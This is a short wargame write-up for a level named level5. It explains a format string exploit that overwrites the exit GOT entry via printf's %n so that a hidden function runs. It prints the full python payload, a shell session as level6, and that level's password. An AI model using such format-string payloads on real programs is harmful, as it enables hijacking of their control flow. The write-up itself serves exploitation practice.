Same as the last exercice, `String format exploit` again.

For this one, we need `printf` to evaluate an `eip` address and change the value by `o` function :

`0x8049838` represents `exit` got address, so we apply `%134513824x%4$n` - 4 (exit got address) to change address by `0x080484a4` : 
```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' ; cat) | ./level5
whoami
level6
cat level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```